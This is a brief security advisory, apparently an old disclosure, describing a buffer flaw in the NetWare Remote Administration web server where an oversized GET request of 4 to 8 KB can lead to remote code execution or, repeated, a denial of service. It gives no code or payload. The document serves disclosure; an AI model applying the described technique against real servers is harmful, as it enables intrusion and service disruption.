The Netware Remote Administration utility can be compromised to allow arbitrary code to be remotely run on the server.

The Remote Administration server is basically a simple webserver, and if sent a GET request of between 4 and 8 kb, some of the data gets written to executable registers.

Even without executable code being sent, this can lead to a DoS as although the server will not crash, the connection will not be aborted or cleaned. Therefore, these failed requests can be made repeatedly until the TCP/IP subsystem will no longer accept connection requests.
